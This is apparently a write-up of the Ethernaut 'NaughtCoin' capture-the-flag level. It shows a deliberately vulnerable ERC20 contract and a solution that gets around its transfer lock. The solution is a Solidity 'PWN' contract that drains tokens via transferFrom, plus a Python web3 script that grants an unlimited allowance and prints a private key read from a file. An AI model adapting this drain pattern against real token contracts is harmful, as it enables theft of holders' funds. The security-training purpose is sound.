![](https://ethernaut.openzeppelin.com/imgs/BigLevel15.svg)

NaughtCoin is an ERC20 token and you're already holding all of them. The catch is that you'll only be able to transfer them after a 10 year lockout period. Can you figure out how to get them out to another address so that you can transfer them freely? Complete this level by getting your token balance to 0.

  Things that might help:
- The [ERC20](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md) Spec
- The [OpenZeppelin](https://github.com/OpenZeppelin/zeppelin-solidity/tree/master/contracts) codebase

```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import 'openzeppelin-contracts-08/token/ERC20/ERC20.sol';

 contract NaughtCoin is ERC20 {

  // string public constant name = 'NaughtCoin';
  // string public constant symbol = '0x0';
  // uint public constant decimals = 18;
  uint public timeLock = block.timestamp + 10 * 365 days;
  uint256 public INITIAL_SUPPLY;
  address public player;

  constructor(address _player) 
  ERC20('NaughtCoin', '0x0') {
    player = _player;
    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));
    // _totalSupply = INITIAL_SUPPLY;
    // _balances[player] = INITIAL_SUPPLY;
    _mint(player, INITIAL_SUPPLY);
    emit Transfer(address(0), player, INITIAL_SUPPLY);
  }
  
  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {
    super.transfer(_to, _value);
  }

  // Prevent the initial owner from transferring tokens until the timelock has passed
  modifier lockTokens() {
    if (msg.sender == player) {
      require(block.timestamp > timeLock);
      _;
    } else {
     _;
    }
  } 
} 
```

Solution:
тут важно знать весь функционал токенов `ERC20`. `modifier lockTokens()` применен только к `transfer`, но не к `transferFrom`, так что просто воспользуемся ей и сольем все токены: 

```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface INaughtCoin{
  function transfer(address _to, uint256 _value) external returns(bool);
  function INITIAL_SUPPLY() external returns(uint256);
  function approve(address _spender, uint256 _value) external returns (bool success);
  function transferFrom(address _from, address _to, uint256 _value) external returns (bool success);
} 

contract PWN {
  address instance;
  INaughtCoin coin;
  address owner = 0x095454F216EC9485da86D49aDffAcFD0Fa3e5BE5;
  uint256 balance;
  constructor (address _instance) {
    instance = _instance;
    coin = INaughtCoin(instance);
    balance = coin.INITIAL_SUPPLY();
  }

  function pwn() external {
    coin.approve(owner, balance);
    coin.transferFrom(owner, instance, balance);
  }
}
```

ну и код апрува от лица кошелька контракту на трату токенов: 

```py
import web3, json

ABI = json.load(open('abi.json'))


def approve(token, spender_address, wallet_address, private_key):
  w3 = web3.Web3(web3.Web3.HTTPProvider("https://ethereum-goerli.publicnode.com"))
  spender = spender_address
  max_amount = w3.to_wei(2**64-1,'ether')
  nonce = w3.eth.get_transaction_count(wallet_address)
  print(nonce)
  token  = w3.eth.contract(address=token, abi=ABI)
  #token = w3.(token)
  tx = token.functions.approve(spender, max_amount).build_transaction({
      'from': wallet_address,
      'nonce': nonce
      })

  signed_tx = w3.eth.account.sign_transaction(tx, private_key)
  tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)

  return w3.to_hex(tx_hash)

with open("private_key_dead_one.txt", "r") as f:
    p_key = f.readline()
    print(p_key)

print(approve(
 token = "0x33eD2E19F26bC0C3d6fb233CDBD33021F6bAC6aE",
 spender_address = "0xa14299879f413a9a3850Cb0d7c8c64dF952C0492",
 wallet_address = "0x095454F216EC9485da86D49aDffAcFD0Fa3e5BE5",
 private_key = p_key
))

```

___
When using code that's not your own, it's a good idea to familiarize yourself with it to get a good understanding of how everything fits together. This can be particularly important when there are multiple levels of imports (your imports have imports) or when you are implementing authorization controls, e.g. when you're allowing or disallowing people from doing things. In this example, a developer might scan through the code and think that `transfer` is the only way to move tokens around, low and behold there are other ways of performing the same operation with a different implementation.